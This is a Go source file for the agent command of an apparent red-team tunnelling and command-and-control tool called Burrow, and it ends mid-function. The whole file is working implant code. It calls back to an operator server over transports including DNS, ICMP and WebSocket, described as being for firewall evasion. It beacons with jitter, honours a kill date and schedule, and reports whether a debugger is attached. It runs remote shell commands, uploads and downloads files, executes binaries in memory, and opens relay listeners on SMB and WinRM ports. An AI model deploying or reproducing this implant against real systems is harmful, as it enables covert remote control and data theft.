package cmd

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/loudmumble/burrow/internal/certgen"
	"github.com/loudmumble/burrow/internal/mux"
	"github.com/loudmumble/burrow/internal/netstack"
	"github.com/loudmumble/burrow/internal/protocol"
	"github.com/loudmumble/burrow/internal/relay"
	"github.com/loudmumble/burrow/internal/sys"
	"github.com/loudmumble/burrow/internal/transport"
	"github.com/loudmumble/burrow/internal/tun"
	_ "github.com/loudmumble/burrow/internal/transport/dns"
	_ "github.com/loudmumble/burrow/internal/transport/doh"
	_ "github.com/loudmumble/burrow/internal/transport/http"
	_ "github.com/loudmumble/burrow/internal/transport/icmp"
	_ "github.com/loudmumble/burrow/internal/transport/raw"
	_ "github.com/loudmumble/burrow/internal/transport/ws"
	"github.com/loudmumble/burrow/internal/tunnel"
	"github.com/spf13/cobra"
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Connect back to a Burrow proxy server",
	Long: `Start the Burrow agent that connects back to a proxy server.

The agent establishes a multiplexed connection to the server and waits for
tunnel and route commands. TLS is enabled by default with certificate
fingerprint verification. Supports multiple transports for firewall evasion.`,
	Example: `  burrow agent -c 10.0.0.1:11601
  burrow agent -c 10.0.0.1:11601 --fp AB:CD:EF:01:23:45:67:89
  burrow agent -c wss://10.0.0.1:443 -t ws
  burrow agent -c 10.0.0.1:5353 -t dns
  burrow agent -c 10.0.0.1 -t icmp`,
	Run: runAgent,
}

func init() {
	rootCmd.AddCommand(agentCmd)

	agentCmd.Flags().StringP("connect", "c", "", "Server address to connect to (required)")
	agentCmd.Flags().StringP("fp", "f", "", "Expected server TLS fingerprint for verification")
	agentCmd.Flags().String("fingerprint", "", "Alias for --fp")
	agentCmd.Flags().MarkHidden("fingerprint")
	agentCmd.Flags().Int("max-retries", 0, "Max reconnection attempts (0 = infinite)")
	agentCmd.Flags().StringP("transport", "t", "raw", "Transport protocol (raw, ws, dns, icmp, http)")
	agentCmd.Flags().Bool("no-tls", false, "Connect without TLS")
	agentCmd.Flags().Duration("beacon", 0, "Beacon interval between sessions (e.g. 30s, 2m) — 0 means persistent")
	agentCmd.Flags().String("kill-date", "", "Self-destruct after this date/time (RFC3339, e.g. 2026-04-15T18:00:00Z)")
	agentCmd.Flags().String("schedule", "", "Only connect during these hours (e.g. 08:00-18:00)")
	agentCmd.MarkFlagRequired("connect")
}

func runAgent(cmd *cobra.Command, _ []string) {
	serverAddr, _ := cmd.Flags().GetString("connect")
	fp, _ := cmd.Flags().GetString("fp")
	if fp == "" {
		fp, _ = cmd.Flags().GetString("fingerprint")
	}
	fingerprint := fp
	maxRetry, _ := cmd.Flags().GetInt("max-retries")
	transportFlag, _ := cmd.Flags().GetString("transport")
	transports := strings.Split(transportFlag, ",")
	for i := range transports {
		transports[i] = strings.TrimSpace(transports[i])
	}
	if len(transports) == 0 || transports[0] == "" {
		transports = []string{"raw"}
	}
	noTLS, _ := cmd.Flags().GetBool("no-tls")
	beacon, _ := cmd.Flags().GetDuration("beacon")
	killDateStr, _ := cmd.Flags().GetString("kill-date")
	scheduleStr, _ := cmd.Flags().GetString("schedule")

	// Parse kill date.
	var killDate time.Time
	if killDateStr != "" {
		var err error
		killDate, err = time.Parse(time.RFC3339, killDateStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Invalid kill-date: %v\n", err)
			os.Exit(1)
		}
		if time.Now().After(killDate) {
			return // Already past kill date
		}
	}

	// Parse schedule (HH:MM-HH:MM).
	var schedStart, schedEnd int // minutes from midnight
	hasSchedule := false
	if scheduleStr != "" {
		parts := strings.SplitN(scheduleStr, "-", 2)
		if len(parts) == 2 {
			schedStart = parseTimeOfDay(parts[0])
			schedEnd = parseTimeOfDay(parts[1])
			if schedStart >= 0 && schedEnd >= 0 {
				hasSchedule = true
			}
		}
	}

	// Ignore SIGPIPE and SIGHUP so the agent survives terminal death.
	signal.Ignore(syscall.SIGPIPE, syscall.SIGHUP)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		cancel()
	}()

	// Kill date watchdog.
	if !killDate.IsZero() {
		go func() {
			for {
				if time.Now().After(killDate) {
					cancel()
					return
				}
				select {
				case <-time.After(time.Minute):
				case <-ctx.Done():
					return
				}
			}
		}()
	}

	retryCount := 0
	for {
		if ctx.Err() != nil {
			return
		}

		// Kill date check.
		if !killDate.IsZero() && time.Now().After(killDate) {
			return
		}

		// Schedule check — wait until inside the active window.
		if hasSchedule {
			if !inSchedule(schedStart, schedEnd) {
				sleepUntilSchedule(ctx, schedStart)
				if ctx.Err() != nil {
					return
				}
				continue
			}
		}

		activeTransport := transports[retryCount%len(transports)]
		conn, err := dialServer(ctx, serverAddr, fingerprint, noTLS, activeTransport)
		if err != nil {
			retryCount++
			if maxRetry > 0 && retryCount > maxRetry {
				os.Exit(1)
			}
			delay := reconnectBackoff(retryCount)
			select {
			case <-time.After(delay):
				continue
			case <-ctx.Done():
				return
			}
		}

		retryCount = 0

		sessionErr := agentSession(ctx, conn)

		if ctx.Err() != nil {
			return
		}

		// If server sent a sleep command, honor it.
		if se, ok := sessionErr.(*sleepError); ok {
			jit := float64(se.duration) * 0.1 * (rand.Float64()*2 - 1)
			delay := se.duration + time.Duration(jit)
			select {
			case <-time.After(delay):
			case <-ctx.Done():
				return
			}
			retryCount = 0
			continue
		}

		if sessionErr != nil {
			fmt.Fprintf(os.Stderr, "[!] Session error: %v\n", sessionErr)
		}

		// Beacon sleep with ±20% jitter.
		if beacon > 0 {
			jit := float64(beacon) * 0.2 * (rand.Float64()*2 - 1)
			delay := beacon + time.Duration(jit)
			select {
			case <-time.After(delay):
			case <-ctx.Done():
				return
			}
		} else {
			retryCount++
			if maxRetry > 0 && retryCount > maxRetry {
				os.Exit(1)
			}
			delay := reconnectBackoff(retryCount)
			select {
			case <-time.After(delay):
			case <-ctx.Done():
				return
			}
		}
	}
}

// sleepError is returned by commandLoop when the server sends MsgSleep.
type sleepError struct{ duration time.Duration }

func (e *sleepError) Error() string {
	return fmt.Sprintf("sleep: %s", e.duration)
}

// parseTimeOfDay parses "HH:MM" and returns minutes from midnight, or -1 on error.
func parseTimeOfDay(s string) int {
	s = strings.TrimSpace(s)
	parts := strings.SplitN(s, ":", 2)
	if len(parts) != 2 {
		return -1
	}
	h, err1 := fmt.Sscanf(parts[0], "%d", new(int))
	m, err2 := fmt.Sscanf(parts[1], "%d", new(int))
	if h != 1 || m != 1 || err1 != nil || err2 != nil {
		return -1
	}
	var hour, min int
	fmt.Sscanf(parts[0], "%d", &hour)
	fmt.Sscanf(parts[1], "%d", &min)
	if hour < 0 || hour > 23 || min < 0 || min > 59 {
		return -1
	}
	return hour*60 + min
}

// inSchedule checks if the current local time is within the active window.
func inSchedule(startMin, endMin int) bool {
	now := time.Now()
	nowMin := now.Hour()*60 + now.Minute()
	if startMin <= endMin {
		return nowMin >= startMin && nowMin < endMin
	}
	// Wraps midnight (e.g., 22:00-06:00)
	return nowMin >= startMin || nowMin < endMin
}

// sleepUntilSchedule sleeps until the schedule window opens.
func sleepUntilSchedule(ctx context.Context, startMin int) {
	now := time.Now()
	nowMin := now.Hour()*60 + now.Minute()
	var waitMin int
	if nowMin < startMin {
		waitMin = startMin - nowMin
	} else {
		waitMin = (24*60 - nowMin) + startMin
	}
	// Add 1-5 minutes of jitter.
	jitter := time.Duration(1+rand.IntN(5)) * time.Minute
	select {
	case <-time.After(time.Duration(waitMin)*time.Minute + jitter):
	case <-ctx.Done():
	}
}

func dialServer(ctx context.Context, addr, fingerprint string, noTLS bool, transportName string) (net.Conn, error) {
	var tlsCfg *tls.Config
	if !noTLS {
		tlsCfg = buildClientTLSConfig(fingerprint)
	}

	// Auto-prefix ws:// or wss:// for WebSocket transport if not present
	if transportName == "ws" && !strings.HasPrefix(addr, "ws://") && !strings.HasPrefix(addr, "wss://") {
		if noTLS {
			addr = "ws://" + addr
		} else {
			addr = "wss://" + addr
		}
	}

	// Auto-prefix http:// or https:// for HTTP transport if not present
	if transportName == "http" && !strings.HasPrefix(addr, "http://") && !strings.HasPrefix(addr, "https://") {
		if noTLS {
			addr = "http://" + addr
		} else {
			addr = "https://" + addr
		}
	}

	newTransport, ok := transport.Registry[transportName]
	if !ok {
		return nil, fmt.Errorf("unknown transport: %s", transportName)
	}

	t := newTransport()
	return t.Dial(ctx, addr, tlsCfg)
}

func buildClientTLSConfig(fingerprint string) *tls.Config {
	if fingerprint == "" {
		return &tls.Config{
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		}
	}

	expected := strings.ToUpper(strings.TrimSpace(fingerprint))
	return &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true,
		VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return errors.New("no peer certificates presented")
			}
			cert, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
				return fmt.Errorf("parse peer certificate: %w", err)
			}
			actual := certgen.Fingerprint(cert)
			if !strings.HasPrefix(actual, expected) {
				return fmt.Errorf("%w: expected %s, got %s",
					certgen.ErrFingerprintMismatch, expected, actual)
			}
			return nil
		},
	}
}

func agentSession(ctx context.Context, conn net.Conn) error {
	defer conn.Close()
	relay.TuneConn(conn) // TCP_NODELAY on the transport — critical for interactive shells

	sess, err := mux.NewClientSession(conn)
	if err != nil {
		return fmt.Errorf("mux session: %w", err)
	}
	defer sess.Close()

	ctrl, err := sess.Open()
	if err != nil {
		return fmt.Errorf("open control stream: %w", err)
	}
	defer ctrl.Close()

	hostname, _ := os.Hostname()
	localIPs := getLocalIPs()

	handshake := &protocol.HandshakePayload{
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		IPs:       localIPs,
		PID:       os.Getpid(),
		Version:   version,
		NumCPU:    runtime.NumCPU(),
		GoVersion: runtime.Version(),
		Debugged:  isDebuggerAttached(),
	}
	msg, err := protocol.EncodeHandshake(handshake)
	if err != nil {
		return fmt.Errorf("encode handshake: %w", err)
	}
	if err := protocol.WriteMessage(ctrl, msg); err != nil {
		return fmt.Errorf("send handshake: %w", err)
	}

	ackMsg, err := protocol.ReadMessage(ctrl)
	if err != nil {
		return fmt.Errorf("read handshake ack: %w", err)
	}
	ack, err := protocol.DecodeHandshakeAck(ackMsg)
	if err != nil {
		return fmt.Errorf("decode handshake ack: %w", err)
	}
	fmt.Printf("[*] Session ID: %s (server %s)\n", ack.SessionID, ack.ProxyVersion)

	// Start proxy stream acceptor for SOCKS5 routing.
	go acceptProxyStreams(ctx, sess)

	return commandLoop(ctx, ctrl, sess)
}

func commandLoop(ctx context.Context, ctrl net.Conn, sess *mux.Session) error {
	activeTunnels := make(map[string]*tunnel.Tunnel)
	activeListeners := make(map[string]net.Listener)
	activeRoutes := make(map[string]string)
	var ctrlMu sync.Mutex

	var tunNS *netstack.Stack
	var tunStream net.Conn
	var tunCancel context.CancelFunc
	var tunCloseDone chan struct{}

	var tapNS *netstack.Stack
	var tapStream net.Conn
	var tapCancel context.CancelFunc
	var tapClaimedCIDR string
	var tapClaimedIface string

	defer func() {
		if tunCancel != nil {
			tunCancel()
		}
		if tunStream != nil {
			tunStream.Close()
		}
		if tunNS != nil {
			go tunNS.Close() // async — don't block reconnect on active TCP conns
		}
		if tapCancel != nil {
			tapCancel()
		}
		if tapStream != nil {
			tapStream.Close()
		}
		if tapNS != nil {
			go tapNS.Close()
		}
		for _, t := range activeTunnels {
			t.Stop()
		}
		for _, l := range activeListeners {
			l.Close()
		}
	}()

	msgCh := make(chan *protocol.Message, 32)
	errCh := make(chan error, 1)

	go func() {
		for {
			msg, err := protocol.ReadMessage(ctrl)
			if err != nil {
				select {
				case errCh <- err:
				default:
				}
				return
			}
			select {
			case msgCh <- msg:
			case <-ctx.Done():
				return
			}
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return nil

		case err := <-errCh:
			return fmt.Errorf("read command: %w", err)

		case msg := <-msgCh:
			switch msg.Type {
			case protocol.MsgPing:
				ctrlMu.Lock()
				err := protocol.WriteMessage(ctrl, protocol.NewPong())
				ctrlMu.Unlock()
				if err != nil {
					return fmt.Errorf("send pong: %w", err)
				}

			case protocol.MsgTunnelRequest:
				req, err := protocol.DecodeTunnelRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad tunnel request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Tunnel request: %s %s -> %s (%s)\n",
					req.Direction, req.ListenAddr, req.RemoteAddr, req.Protocol)

				switch req.Direction {
				case "local":
					t := tunnel.NewLocalForward(req.ListenAddr, req.RemoteAddr)
					startErr := t.StartWithContext(ctx)
					ackPayload := &protocol.TunnelAckPayload{ID: req.ID}
					if startErr != nil {
						ackPayload.Error = startErr.Error()
					} else {
						ackPayload.BoundAddr = t.Addr()
						activeTunnels[req.ID] = t
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()

				case "remote", "reverse":
					// Remote tunnel: agent listens, forwards connections through yamux back to server
					listenProto := req.Protocol
					if listenProto == "" {
						listenProto = "tcp"
					}
					if !strings.Contains(req.ListenAddr, "[") {
						listenProto = "tcp4"
					}
					ln, listenErr := net.Listen(listenProto, req.ListenAddr)
					if listenErr == nil {
						ln = transport.WrapListener(ln)
					}
					ackPayload := &protocol.TunnelAckPayload{ID: req.ID}
					if listenErr != nil {
						ackPayload.Error = listenErr.Error()
					} else {
						ackPayload.BoundAddr = ln.Addr().String()
						activeListeners[req.ID] = ln
						go remoteTunnelAcceptLoop(ctx, ln, sess, req.RemoteAddr)
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()

				default:
					ackPayload := &protocol.TunnelAckPayload{
						ID:    req.ID,
						Error: fmt.Sprintf("unknown direction: %s", req.Direction),
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()
				}

			case protocol.MsgRouteAdd:
				route, err := protocol.DecodeRouteAdd(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad route add: %v\n", err)
					continue
				}
				activeRoutes[route.CIDR] = route.Gateway
				fmt.Printf("[*] Route added: %s via %s\n", route.CIDR, route.Gateway)

			case protocol.MsgRouteRemove:
				route, err := protocol.DecodeRouteRemove(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad route remove: %v\n", err)
					continue
				}
				delete(activeRoutes, route.CIDR)
				fmt.Printf("[*] Route removed: %s\n", route.CIDR)

			case protocol.MsgTunnelClose:
				tunnelID, err := protocol.DecodeTunnelClose(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad tunnel close: %v\n", err)
					continue
				}
				if t, ok := activeTunnels[tunnelID]; ok {
					t.Stop()
					delete(activeTunnels, tunnelID)
					fmt.Printf("[*] Tunnel closed: %s\n", tunnelID)
				} else if l, ok := activeListeners[tunnelID]; ok {
					l.Close()
					delete(activeListeners, tunnelID)
					fmt.Printf("[*] Remote tunnel closed: %s\n", tunnelID)
				} else {
					fmt.Printf("[*] Tunnel close (unknown ID): %s\n", tunnelID)
				}

			case protocol.MsgListenerRequest:
				req, err := protocol.DecodeListenerRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad listener request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Listener request: %s -> %s\n",
					req.ListenAddr, req.ForwardAddr)

				network := "tcp"
				if !strings.Contains(req.ListenAddr, "[") {
					network = "tcp4"
				}
				ln, listenErr := net.Listen(network, req.ListenAddr)
				if listenErr == nil {
					ln = transport.WrapListener(ln)
				}
				ackPayload := &protocol.ListenerAckPayload{ID: req.ID}
				if listenErr != nil {
					ackPayload.Error = listenErr.Error()
				} else {
					ackPayload.BoundAddr = ln.Addr().String()
					activeListeners[req.ID] = ln
					go acceptAndRelay(ctx, ln, req.ForwardAddr)
				}
				ackMsg, encErr := protocol.EncodeListenerAck(ackPayload)
				if encErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Encode listener ack: %v\n", encErr)
					continue
				}
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ackMsg)
				ctrlMu.Unlock()

			case protocol.MsgTunStart:
				fmt.Println("[*] TUN start requested by server")
				// Wait for any previous netstack close to finish.
				if tunCloseDone != nil {
					<-tunCloseDone
					tunCloseDone = nil
				}
				ns, nsErr := netstack.New(netstack.Opts{})
				ackPayload := &protocol.TunStartAckPayload{}
				if nsErr != nil {
					ackPayload.Error = nsErr.Error()
				}
				ackMsg, encErr := protocol.EncodeTunStartAck(ackPayload)
				if encErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Encode TUN start ack: %v\n", encErr)
					continue
				}
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ackMsg)
				ctrlMu.Unlock()
				if nsErr != nil {
					fmt.Fprintf(os.Stderr, "[!] TUN start failed: %v\n", nsErr)
					continue
				}
				dataStream, streamErr := sess.Open()
				if streamErr != nil {
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TUN data stream failed: %v\n", streamErr)
					continue
				}
				if _, writeErr := dataStream.Write([]byte{0x01}); writeErr != nil {
					dataStream.Close()
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TUN stream type write failed: %v\n", writeErr)
					continue
				}
				tunNS = ns
				tunStream = dataStream
				tunCtx, cancel := context.WithCancel(ctx)
				tunCancel = cancel
				go tunAgentRelay(tunCtx, dataStream, ns)
				fmt.Println("[*] TUN mode active")

			case protocol.MsgTunStop:
				fmt.Println("[*] TUN stop requested")
				if tunCancel != nil {
					tunCancel()
					tunCancel = nil
				}
				if tunStream != nil {
					tunStream.Close()
					tunStream = nil
				}
				// Close netstack asynchronously — Close() blocks on wg.Wait()
				// for active TCP connections. Don't block the command loop.
				if tunNS != nil {
					ns := tunNS
					tunNS = nil
					done := make(chan struct{})
					go func() {
						ns.Close()
						close(done)
					}()
					tunCloseDone = done
				}
				fmt.Println("[*] TUN mode stopped")

			case protocol.MsgTapStart:
				fmt.Println("[*] TAP start requested by server")
				tapPayload, decErr := protocol.DecodeTapStart(msg)
				if decErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad TAP start: %v\n", decErr)
					continue
				}
				// Claim the TAP IP on the agent's physical interface.
				tapCIDR := tapPayload.Interface
				if tapCIDR != "" {
					ifName, _ := tun.DefaultInterface()
					if ifName != "" {
						addErr := exec.Command("ip", "addr", "add", tapCIDR, "dev", ifName).Run()
						if addErr != nil {
							fmt.Fprintf(os.Stderr, "[!] Could not add %s to %s: %v (inbound relay won't work)\n", tapCIDR, ifName, addErr)
						} else {
							fmt.Printf("[*] Claimed %s on %s for inbound relay\n", tapCIDR, ifName)
							tapClaimedCIDR = tapCIDR
							tapClaimedIface = ifName
						}
					}
				}
				ns, nsErr := netstack.New(netstack.Opts{})
				ackPayload := &protocol.TapStartAckPayload{}
				if nsErr != nil {
					ackPayload.Error = nsErr.Error()
				}
				ackMsg, encErr := protocol.EncodeTapStartAck(ackPayload)
				if encErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Encode TAP start ack: %v\n", encErr)
					continue
				}
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ackMsg)
				ctrlMu.Unlock()
				if nsErr != nil {
					fmt.Fprintf(os.Stderr, "[!] TAP start failed: %v\n", nsErr)
					continue
				}
				dataStream, streamErr := sess.Open()
				if streamErr != nil {
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TAP data stream failed: %v\n", streamErr)
					continue
				}
				if _, writeErr := dataStream.Write([]byte{0x03}); writeErr != nil {
					dataStream.Close()
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TAP stream type write failed: %v\n", writeErr)
					continue
				}
				tapNS = ns
				tapStream = dataStream
				tapCtx, cancel := context.WithCancel(ctx)
				tapCancel = cancel
				go tapAgentRelay(tapCtx, dataStream, ns)
				// Start inbound relay listeners for common relay ports.
				// These accept connections on the claimed IP and forward
				// them back through the yamux session to the operator.
				relayPorts := []int{445, 80, 135, 5985, 6666, 9389}
				for _, port := range relayPorts {
					addr := fmt.Sprintf("0.0.0.0:%d", port)
					network := "tcp"
					if !strings.Contains(addr, "[") {
						network = "tcp4"
					}
					ln, listenErr := net.Listen(network, addr)
					if listenErr != nil {
						fmt.Fprintf(os.Stderr, "[!] TAP inbound :%d: %v\n", port, listenErr)
						continue
					}
					fmt.Printf("[*] TAP inbound relay on :%d → operator\n", port)
					remoteAddr := fmt.Sprintf("127.0.0.1:%d", port)
					go remoteTunnelAcceptLoop(tapCtx, ln, sess, remoteAddr)
				}
				fmt.Println("[*] TAP mode active")

			case protocol.MsgTapStop:
				fmt.Println("[*] TAP stop requested")
				if tapCancel != nil {
					tapCancel() // kills inbound relay listeners too
					tapCancel = nil
				}
				if tapStream != nil {
					tapStream.Close()
					tapStream = nil
				}
				if tapNS != nil {
					ns := tapNS
					tapNS = nil
					go ns.Close()
				}
				// Remove claimed IP
				if tapClaimedCIDR != "" && tapClaimedIface != "" {
					exec.Command("ip", "addr", "del", tapClaimedCIDR, "dev", tapClaimedIface).Run()
					fmt.Printf("[*] Released %s from %s\n", tapClaimedCIDR, tapClaimedIface)
					tapClaimedCIDR = ""
					tapClaimedIface = ""
				}
				fmt.Println("[*] TAP mode stopped")

			case protocol.MsgExecRequest:
				req, err := protocol.DecodeExecRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad exec request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Exec request: %s\n", req.Command)
				go func(id, command string) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in exec handler: %v\n", r)
						}
					}()
					resp := &protocol.ExecResponsePayload{ID: id}
					var cmd *exec.Cmd
					if runtime.GOOS == "windows" {
						cmd = exec.Command("cmd", "/C", command)
					} else {
						cmd = exec.Command("sh", "-c", command)
					}
					out, execErr := cmd.CombinedOutput()
					resp.Output = strings.TrimRight(string(out), "\r\n")
					if execErr != nil {
						resp.Error = execErr.Error()
					}
					respMsg, encErr := protocol.EncodeExecResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode exec response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.Command)

			case protocol.MsgFileDownloadRequest:
				req, err := protocol.DecodeFileDownloadRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad file download request: %v\n", err)
					continue
				}
				fmt.Printf("[*] File download request: %s\n", req.FilePath)
				go func(id, filePath string) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in file download handler: %v\n", r)
						}
					}()
					resp := &protocol.FileDownloadResponsePayload{ID: id}
					data, readErr := os.ReadFile(filePath)
					if readErr != nil {
						resp.Error = readErr.Error()
					} else {
						resp.FileName = filepath.Base(filePath)
						resp.Data = data
						resp.Size = int64(len(data))
					}
					respMsg, encErr := protocol.EncodeFileDownloadResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode file download response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.FilePath)

			case protocol.MsgFileUploadRequest:
				req, err := protocol.DecodeFileUploadRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad file upload request: %v\n", err)
					continue
				}
				fmt.Printf("[*] File upload request: %s\n", req.FilePath)
				go func(id, filePath string, data []byte) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in file upload handler: %v\n", r)
						}
					}()
					resp := &protocol.FileUploadResponsePayload{ID: id}
					writeErr := os.WriteFile(filePath, data, 0644)
					if writeErr != nil {
						resp.Error = writeErr.Error()
					} else {
						resp.Size = int64(len(data))
					}
					respMsg, encErr := protocol.EncodeFileUploadResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode file upload response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.FilePath, req.Data)
			case protocol.MsgSleep:
				sp, err := protocol.DecodeSleep(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad sleep: %v\n", err)
					continue
				}
				dur := time.Duration(sp.Seconds) * time.Second
				return &sleepError{duration: dur}

			case protocol.MsgUpgrade:
				up, err := protocol.DecodeUpgrade(msg)
				if err != nil {
					ack, _ := protocol.EncodeUpgradeAck("decode: " + err.Error())
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ack)
					ctrlMu.Unlock()
					continue
				}
				ack, _ := protocol.EncodeUpgradeAck("")
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ack)
				ctrlMu.Unlock()
				
				// Optional: wait a moment for the ack to flush, though Close helps
				ctrl.Close()
				
				if execErr := sys.MemExec(up.Binary, up.Args); execErr != nil {
					return fmt.Errorf("upgrade exec: %w", execErr)
				}
				return nil

			case protocol.MsgError:
				errStr, _ := protocol.DecodeError(msg)
				return fmt.Errorf("server error: %s", errStr)

			default:
				fmt.Fprintf(os.Stderr, "[!] Unknown message type: %s\n", msg.Type)
			}
		}
	}
}

func acceptAndRelay(ctx context.Context, ln net.Listener, forwardAddr string) {
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return
			}
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			relay.TuneConn(c)
			network := "tcp"
			if !strings.Contains(forwardAddr, "[") {
				network = "tcp4"
			}
			remote, err := net.DialTimeout(network, forwardAddr, 10*time.Second)
			if err != nil {
				return
			}
			defer remote.Close()
			relay.TuneConn(remote)
			done := make(chan struct{}, 2)
			go func() {
				relay.CopyBuffered(remote, c)
				if tc, ok := remote.(*net.TCPConn); ok {
					tc.CloseWrite()
				}
				done <- struct{}{}
			}()
			go func() {
				relay.CopyBuffered(c, remote)
				if tc, ok := c.(*net.TCPConn); ok {
					tc.CloseWrite()
				}
				done <- struct{}{}
			}()
			<-done
			time.Sleep(50 * time.Millisecond)
			c.Close()
			remote.Close()
			<-done
		}(conn)
	}
}

func getLocalIPs() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return nil
	}
	var ips []string
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	return ips
}

func reconnectBackoff(attempt int) time.Duration {
	return transport.Backoff(time.Second, attempt-1)
}

func tunAgentRelay(ctx context.Context, stream net.Conn, ns *netstack.Stack) {
	// Derive a sub-context so the inject goroutine can unblock ReadPacket
	// immediately when the stream dies (rather than waiting for session cancel).
	relayCtx, relayCancel := context.WithCancel(ctx)
	defer relayCancel()

	injectDone := make(chan struct{})
	// stream → netstack (receive packets from server, inject into gvisor)
	go func() {
		defer close(injectDone)
		defer relayCancel() // unblock ReadPacket on stream failure
		for {
			pkt, err := protocol.ReadRawPacket(stream)
			if err != nil {
				return
			}
			ns.InjectPacket(pkt)
			protocol.PutPacketBuf(pkt)
		}
	}()
	// netstack → stream (read response packets from gvisor, send to server)
	for {
		select {
		case <-injectDone:
			return
		default:
		}
		pkt, err := ns.ReadPacket(relayCtx)
		if err != nil {
			return
		}
		if err := protocol.WriteRawPacket(stream, pkt); err != nil {
			protocol.PutPacketBuf(pkt)
			return
		}
		protocol.PutPacketBuf(pkt)
	}
}

// tapAgentRelay relays Ethernet frames between a yamux stream and a netstack.
// Frames from the operator have their Ethernet header stripped before injection
// into the netstack. Response packets from netstack get an Ethernet header
// prepended before being sent back to the operator's TAP interface.
func tapAgentRelay(ctx context.Context, stream net.Conn, ns *netstack.Stack) {
	relayCtx, relayCancel := context.WithCancel(ctx)
	defer relayCancel()

	injectDone := make(chan struct{})
	// stream → netstack (receive frames from operator, strip L2 header, inject as IP)
	go func() {
		defer close(injectDone)
		defer relayCancel()
		for {
			frame, err := protocol.ReadRawPacket(stream)
			if err != nil {
				return
			}
			// Strip 14-byte Ethernet header to get the IP packet.
			if len(frame) > tun.EthHeaderLen {
				ns.InjectPacket(frame[tun.EthHeaderLen:])
			}
			protocol.PutPacketBuf(frame)
		}
	}()
	// netstack → stream (send raw IP packets — operator adds Ethernet header)
	for {
		select {
		case <-injectDone:
			return
		default:
		}
		pkt, err := ns.ReadPacket(relayCtx)
		if err != nil {
			return
		}
		if err := protocol.WriteRawPacket(stream, pkt); err != nil {
			protocol.PutPacketBuf(pkt)
			return
		}
		protocol.PutPacketBuf(pkt)
